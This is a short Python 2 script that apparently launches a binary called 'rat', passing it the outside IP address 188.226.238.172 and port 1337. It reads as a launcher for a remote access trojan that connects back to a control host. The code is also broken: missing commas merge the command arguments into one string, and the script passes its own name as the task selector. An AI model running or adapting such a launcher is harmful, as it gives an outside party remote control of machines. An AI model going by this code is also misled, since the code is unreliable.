#! /usr/bin/env python

import sys
from subprocess import call


def check_args():
	if len(sys.argv) < 1:
		print "Too few args"

def spawn_task(droplet="ink"):

	if droplet.lower() == "bench":
		try:
			call(["./rat" "188.226.238.172" "1337"])
		except Exception, e:
			raise e

	if droplet.lower() == "ink":
		try:
			call(["rat" "188.226.238.172" "1337"])
		except Exception, e:
			raise e


if __name__ == '__main__':
	check_args()
	spawn_task(sys.argv[0])